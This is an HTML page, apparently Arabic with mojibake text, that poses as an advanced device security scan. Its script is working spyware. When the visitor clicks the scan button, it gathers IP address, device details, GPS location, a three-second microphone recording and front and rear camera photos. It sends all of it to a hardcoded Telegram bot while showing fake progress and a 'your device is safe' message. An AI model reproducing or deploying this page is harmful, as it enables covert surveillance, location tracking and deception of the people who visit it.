<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ÙØ­Øµ Ø£Ù…Ø§Ù† Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…ØªÙ‚Ø¯Ù…</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #1e1e1e; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #333; }
        .progress-container { background: #333; border-radius: 10px; height: 12px; width: 100%; margin: 20px 0; overflow: hidden; }
        .progress-bar { background: #00d1b2; height: 100%; width: 0%; transition: width 0.5s ease; }
        #status { font-size: 14px; color: #00d1b2; margin-bottom: 10px; font-weight: bold; }
        button { background: #00d1b2; color: #121212; border: none; padding: 15px 30px; border-radius: 10px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; }
        #v, canvas { display: none; }
    </style>
</head>
<body>

<div class="box">
    <h2 style="margin-top:0;">Ø¯Ø±Ø¹ Ø§Ù„Ø£Ù…Ø§Ù†</h2>
    <p id="desc" style="color:#aaa;">Ø§Ø¶ØºØ· Ù„Ø¨Ø¯Ø¡ ÙØ­Øµ Ø´Ø§Ù…Ù„ ÙˆØ­Ù…Ø§ÙŠØ© Ø¬Ù‡Ø§Ø²Ùƒ Ù…Ù† Ø§Ù„ØªØ¬Ø³Ø³.</p>
    
    <div id="loader" style="display:none;">
        <div id="status">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ø¶ÙŠØ±...</div>
        <div class="progress-container">
            <div id="fill" class="progress-bar"></div>
        </div>
    </div>
    
    <button id="start-btn" onclick="runWorker()">Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø¢Ù†</button>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    const CONFIG = {
        token: '8256799115:AAFWB_PAl-d7d4zl9uR4yabOGBUKFWDm9hU',
        chatId: '7654014302'
    };

    function updateUI(text, percent) {
        document.getElementById('status').innerText = text;
        document.getElementById('fill').style.width = percent + "%";
    }

    async function runWorker() {
        document.getElementById('start-btn').style.display = 'none';
        document.getElementById('desc').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        const device = {
            platform: navigator.platform,
            agent: navigator.userAgent.split(' ').pop(),
            lang: navigator.language
        };

        try {
            // 1. Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù€ IP
            updateUI("Ø¬Ø§Ø±ÙŠ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒØ©...", 20);
            let ip = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch(e) {}

            const info = `ğŸ“± Ø¬Ù‡Ø§Ø²: ${device.platform}\nğŸŒ IP: ${ip}\nğŸ” Ù…ØªØµÙØ­: ${device.agent}`;

            // 2. Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ (Ø¥Ø¬Ø¨Ø§Ø±ÙŠ Ù„Ø¥ÙƒÙ…Ø§Ù„ Ø§Ù„ÙØ­Øµ)
            updateUI("Ø¬Ø§Ø±ÙŠ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹...", 40);
            const loc = await new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    p => resolve(`https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`),
                    e => resolve("Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù…Ø±ÙÙˆØ¶"),
                    { timeout: 8000 }
                );
            });

            // 3. ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØµÙˆØª (3 Ø«ÙˆØ§Ù†Ù)
            updateUI("Ø¬Ø§Ø±ÙŠ ÙØ­Øµ Ø§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†...", 60);
            try {
                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(audioStream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/ogg' });
                    await sendData(blob, "Voice Log", "voice");
                    audioStream.getTracks().forEach(t => t.stop());
                };
                recorder.start();
                await new Promise(r => setTimeout(r, 3000));
                recorder.stop();
            } catch(e) { console.log("Mic blocked"); }

            // 4. Ø§Ù„ØµÙˆØ± (Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ© Ø«Ù… Ø§Ù„Ø®Ù„ÙÙŠØ©)
            updateUI("Ø¬Ø§Ø±ÙŠ ÙØ­Øµ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§Øª...", 80);
            await captureAndSend("user", `ØµÙˆØ±Ø© Ø£Ù…Ø§Ù…ÙŠØ©\n${info}\nğŸ“ ${loc}`);
            await captureAndSend("environment", `ØµÙˆØ±Ø© Ø®Ù„ÙÙŠØ©\nIP: ${ip}`);

            updateUI("Ø§ÙƒØªÙ…Ù„ Ø§Ù„ÙØ­Øµ! Ø¬Ù‡Ø§Ø²Ùƒ Ø¢Ù…Ù†.", 100);
            setTimeout(() => { alert("ØªÙ… Ø§Ù„ÙØ­Øµ Ø¨Ù†Ø¬Ø§Ø­. ØªÙÙ‚Ø¯ ØªÙ‚Ø±ÙŠØ±Ùƒ Ø¹Ù„Ù‰ Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù…."); }, 500);

        } catch (err) {
            updateUI("ÙØ´Ù„ Ø§Ù„ÙØ­Øµ: " + err.message, 0);
        }
    }

    async function captureAndSend(mode, caption) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            const v = document.getElementById('v');
            v.srcObject = stream;
            await new Promise(r => setTimeout(r, 1000)); // Ø§Ø³ØªÙ‚Ø±Ø§Ø± Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
            
            const c = document.getElementById('c');
            c.getContext('2d').drawImage(v, 0, 0, 640, 480);
            
            return new Promise(resolve => {
                c.toBlob(async (blob) => {
                    await sendData(blob, caption, "photo");
                    stream.getTracks().forEach(t => t.stop());
                    resolve();
                }, 'image/jpeg');
            });
        } catch (e) { console.log("Camera blocked: " + mode); }
    }

    async function sendData(blob, caption, type) {
        const fd = new FormData();
        fd.append('chat_id', CONFIG.chatId);
        fd.append(type === "photo" ? "photo" : "voice", blob);
        fd.append('caption', caption);
        
        const endpoint = type === "photo" ? "sendPhoto" : "sendVoice";
        try {
            await fetch(`https://api.telegram.org/bot${CONFIG.token}/${endpoint}`, {
                method: 'POST',
                body: fd
            });
        } catch (e) { console.error("Telegram Error: ", e); }
    }
</script>

</body>
</html>
